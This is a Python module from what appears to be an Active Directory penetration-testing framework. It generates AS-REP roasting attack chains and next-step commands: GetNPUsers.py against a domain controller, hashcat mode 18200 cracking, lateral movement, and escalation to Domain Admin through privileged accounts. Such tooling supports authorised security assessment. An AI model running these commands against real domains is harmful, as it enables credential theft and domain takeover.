"""ReconForge AD Attack Paths — AS-REP roasting candidates.

Author: Andrews Ferreira
"""

from typing import Any

from modules.ad.attack_paths.base import (
    AttackChain,
    AttackPathBuilderBase,
    AttackPathResult,
    NextStepSuggestion,
)


class AsrepPathBuilder(AttackPathBuilderBase):
    """Build AS-REP roasting attack paths."""

    BUILDER_NAME = "asrep"

    def build(
        self, analysis_data: dict[str, Any],
        target: str = "", domain: str = "", **kwargs,
    ) -> AttackPathResult:
        result = AttackPathResult(builder=self.BUILDER_NAME)

        asrep_users = analysis_data.get("asrep_users", [])
        asreproastable = analysis_data.get("asreproastable", [])

        targets = asreproastable or [a.get("username", "") for a in asrep_users if a.get("username")]
        if not targets:
            return result

        result.chains.append(AttackChain(
            name="AS-REP Roasting → Offline Cracking",
            description="Users without pre-auth can have their hashes cracked offline",
            steps=[
                f"GetNPUsers.py {domain}/ -dc-ip {target} -no-pass",
                "Crack AS-REP hashes with hashcat -m 18200",
                "Use cracked credentials for lateral movement",
            ],
            risk="high",
            prerequisites=["AS-REP roastable users identified"],
            references=["https://attack.mitre.org/techniques/T1558/004/"],
            chain_type="asrep",
        ))

        # Check for privileged AS-REP roastable
        privileged = set(analysis_data.get("privileged_users", []))
        priv_asrep = [u for u in targets if u in privileged]
        if priv_asrep:
            result.chains.append(AttackChain(
                name="AS-REP Roast Privileged Account → Domain Admin",
                description=f"Privileged AS-REP roastable: {', '.join(priv_asrep[:5])}",
                steps=[
                    f"AS-REP roast {priv_asrep[0]}",
                    "Crack AS-REP hash offline",
                    f"Authenticate as {priv_asrep[0]}",
                    "Escalate to Domain Admin via group membership",
                ],
                risk="critical",
                chain_type="asrep",
            ))

        result.suggestions.append(NextStepSuggestion(
            command=f"GetNPUsers.py {domain}/ -dc-ip {target} -no-pass -usersfile users.txt",
            justification=f"AS-REP roast {len(targets)} accounts",
            priority="high",
        ))
        result.suggestions.append(NextStepSuggestion(
            command="hashcat -m 18200 asrep_hashes.txt wordlist.txt",
            justification="Crack AS-REP hashes offline",
            priority="high",
        ))

        return result
